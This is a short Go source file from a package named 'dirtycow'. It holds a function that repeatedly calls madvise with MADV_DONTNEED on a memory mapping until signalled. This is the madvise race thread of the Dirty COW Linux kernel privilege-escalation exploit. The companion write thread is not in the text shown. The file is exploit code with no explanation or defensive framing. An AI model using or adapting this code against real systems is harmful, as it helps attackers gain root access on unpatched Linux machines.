package dirtycow

import "syscall"

func madvise_thread(mmap uintptr) bool {

	for i := 0; i < 1000000; i++ {

		select {
		case <- signals:
			return true
		default:
			syscall.Syscall(
				syscall.SYS_MADVISE,
				mmap,
				uintptr(100),
				syscall.MADV_DONTNEED,
			)
		}

	}

	return false

}
